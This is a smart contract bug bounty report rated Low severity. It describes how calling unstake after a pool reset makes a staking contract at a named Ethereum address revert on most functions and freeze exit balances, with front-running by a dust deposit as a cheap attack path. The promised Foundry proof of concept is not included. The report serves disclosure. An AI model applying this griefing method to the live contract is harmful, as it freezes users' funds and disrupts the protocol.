* **Report ID:** #36309
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** https://etherscan.io/address/0xd042C267758eDDf34B481E1F539d637e41db3e5a

  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

After a pool gets reset, a depositor can call unstake to intentionally (or unintentionally) break almost all functionalities of the smart contract, including staking and unstaking. Leading to a freezing of funds in cases were and ExitBalance is present, or to a general disruption of service otherwise.

## Vulnerability Details

When a pool gets reset the associated reservation ID gets set to 0, together with any pending epoch: \`\`\` function \_resetPool(address \_tokenAddress) internal { // Note: we are not calling \_unlockEligibleTokenContractPendingUnstakes because it can call this function.

```
    ContractState storage contractStateStorage &#x3D; tokenContractState[_tokenAddress];

    uint256 unitsToReset &#x3D; contractStateStorage.totalUnits;
    if (unitsToReset &#x3D;&#x3D; 0) {
        // This already has the state that a reset would achieve, so it&#x27;s not required.
        return;
    }

    // NB: must be resetNonce++, NOT ++resetNonce
    uint256 resetNonce &#x3D; contractStateStorage.resetNonce++;

    uint256 tokensToReset;
    {
        uint96 reservationId &#x3D; contractStateStorage.collateralReservationId;
        if (reservationId !&#x3D; 0) {
            // Unlock all pool tokens so they are releasable.
            tokensToReset &#x3D; collateral.releaseAllCollateral(reservationId);
            contractStateStorage.collateralReservationId &#x3D; 0;
        }
    }

    // Only set an Exit balance if there is one. If all tokens were claimed, then effectively set (0,0).
    if (tokensToReset &gt; 0) {
        // Create the reset ExitBalance so stakers can exit their tokens (see: _resetAccountTokenStateIfApplicable(...))
        tokenResetExitBalances[_tokenAddress][resetNonce] &#x3D; ExitBalance(unitsToReset, tokensToReset);
    }

    // Delete all contract-level pending unstake state.
    if (contractStateStorage.firstPendingUnstakeEpoch &gt; 0) {
        contractStateStorage.firstPendingUnstakeEpoch &#x3D; 0;
        contractStateStorage.firstPendingUnstakeUnits &#x3D; 0;

        if (contractStateStorage.secondPendingUnstakeEpoch &gt; 0) {
            contractStateStorage.secondPendingUnstakeEpoch &#x3D; 0;
            contractStateStorage.secondPendingUnstakeUnits &#x3D; 0;
        }
    }

    contractStateStorage.totalUnits &#x3D; 0;

    emit PoolReset(IERC20(_tokenAddress), resetNonce + 1, tokensToReset, unitsToReset);
}
```

\`\`\` This two facts will be relevant inside of the '\_unlockEligibleTokenContractPendingUnstakes', which gets called by all stake functionalities, unstake and claim. As calling unstake after the pool got reset will cause \_unlockEligibleTokenContractPendingUnstakes to revert braking all of the above functionalities, here is why:

As you may notice at the begging, if uint256 firstEpoch = contractStateStorage.firstPendingUnstakeEpoch; is 0, no further computations will be made, avoiding any unexpected revert, that would come from interacting with the underlying Collateral contract trough a reservation with ID equal to 0. That said a user can call unstake to froce the contractStateStorage.firstPendingUnstakeEpoch to be greater than 0\*\*, meaning that after the epoch elapses, the above mentioned check will pass and, unless someone have deposited before the time has passed, every functionality dependent on \_unlockEligibleTokenContractPendingUnstakes will revert, breaking almost every functionalities of the contract with respect to the targeted token and freezing any funds found in a potential ExitBalance allocation until the implementation gets re deployed (with the owner's time lock currently having a min delay of 7 days).

\*\*Note that the check performed inside of unstake, to verify if the account was reset will be ignored, as when epoch is equal to 0, the \_poolWasReset variable will be set to false, meaning that accountWasReset will also be set to false, allowing the execution to reach the critical \_addToContractPendingUnstakeNextEpoch function.

All of this can be done maliciously do damage the users and owners of the protocol (even by frontrunning the pool's reset with a dust amount deposit, see PoC) or by mistake by a user trying to legitimately call unstake.

## Impact Details

Griefing: A malicious user can decide to break most functionalities of the contract either by having some funds staked already of by frontrunning (for almost no cost). Also this might lead to a temporary freezing of funds in cases were an ExitBalance was allocated.

## Proof of Concept

Here is a simple foundry PoC interacting directly with the in scope assets (0xd042C267758eDDf34B481E1F539d637e41db3e5a) after properly initializing it, any interaction trough a proxy would lead to the same results.
